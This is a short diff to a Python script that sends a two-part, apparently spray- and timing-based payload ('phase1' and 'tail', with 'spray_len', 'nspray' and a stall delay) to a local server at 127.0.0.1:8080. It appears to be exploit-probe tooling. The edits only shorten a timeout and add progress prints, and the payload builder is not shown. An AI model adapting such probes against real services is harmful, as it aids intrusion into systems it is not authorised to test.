@@ -30,7 +30,8 @@ def send(host, port, phase1, tail, stall):
     time.sleep(stall)
     try: s.sendall(tail)
     except OSError: s.close(); return b'', 'TAIL-FAILED'
-    s.settimeout(15); out = b''
+    s.settimeout(8); out = b''
+    print('  [sent tail, waiting response]', flush=True)
     try:
         while True:
             d = s.recv(65536)
@@ -45,6 +46,7 @@ def main():
     stall = float(sys.argv[3]) if len(sys.argv) > 3 else 1.4
     sid = 'probe' + uuid.uuid4().hex[:26]
     phase1, tail = build(sid, spray_len, nspray, stall)
+    import functools; print('  [connected, sending phase1]', flush=True)
     resp, err = send('127.0.0.1', 8080, phase1, tail, stall)
     body = resp.split(b'\r\n\r\n', 1)[-1] if resp else b''
     print(f'### PROBE spray_len={spray_len} nspray={nspray} SID={sid} ERR={err}')
